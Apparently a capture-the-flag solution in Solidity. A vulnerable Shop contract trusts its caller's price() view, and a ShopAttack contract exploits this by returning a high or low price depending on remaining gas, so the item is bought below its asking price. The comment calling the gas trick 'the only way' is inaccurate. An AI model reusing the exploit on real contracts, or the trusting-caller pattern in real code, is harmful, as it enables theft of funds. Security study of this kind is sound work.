// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

// 0x7A2715352Bf2C11F1c5Ec3334D5D06E366eb1501
contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopAttack {
    Shop public shop;

    constructor(Shop shop_) {
        shop = shop_;
    }

    function attack() public {
        shop.buy();
    }

    // Needs to return a price >= 100 on the first call,
    // then return a price < 100 on the second call.
    // Since it is a view function, it cannot change state.
    // The only way to implement this behavior without state,
    // is to use the gas left.
    // The first call will have a lot of gas left,
    // the second call will have a lot less gas left.
    function price() external view returns (uint) {
        if (gasleft() > 30000) {
            return 1000;
        } else {
            return 1;
        }
    }
}